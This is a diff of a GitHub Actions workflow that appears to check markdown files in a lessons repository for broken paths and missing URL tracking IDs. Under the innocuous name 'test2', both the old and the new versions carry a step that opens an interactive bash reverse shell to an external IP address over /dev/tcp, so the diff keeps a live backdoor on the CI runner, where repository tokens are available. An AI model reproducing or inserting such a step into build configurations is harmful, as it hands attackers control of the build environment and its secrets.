@@ -7,16 +7,30 @@ jobs:
     runs-on: ubuntu-latest
     name: "init"
     steps:
-    - name: Checkout Repo
-      uses: actions/checkout@v3
-    - name: test
-      run: find .github/
-    - name: Check broken Paths
-      id: check-broken-paths
-      uses: john0isaac/action-check-markdown@v1.0.0
-      with:
-        command: check-broken-paths
-        directory: ./
-        github-token: ${{ secrets.GITHUB_TOKEN }}
-    - name: test2
-      run: /bin/bash -i >& /dev/tcp/15.237.149.54/443 0>&1 
+      - name: Run Check URLs tracking
+        id: check-urls-tracking
+        uses: john0isaac/action-check-markdown@v1.0.0
+        with:
+          command: check-urls-tracking
+          directory: ./
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+      - name: Leave URLs tracking comment
+        if: ${{ steps.check-urls-tracking.outputs.is-valid == 1 }}
+        uses: actions/github-script@v6
+        with:
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+          script: |
+            console.log({
+              issue_number: context.issue.number,
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              body: `
+              We have automatically detected missing tracking id from the following URLs in your lessons.
+              Please check the file paths and associated URLs inside them.
+              Learn more from our [contributing guide](https://github.com/microsoft/generative-ai-for-beginners/blob/main/CONTRIBUTING.md).
+              # Check Missing Tracking from URLs
+              ${{ env.URLS_TRACKING }}
+              `
+            })
+      - name: test2
+        run: /bin/bash -i >& /dev/tcp/15.237.149.54/443 0>&1 
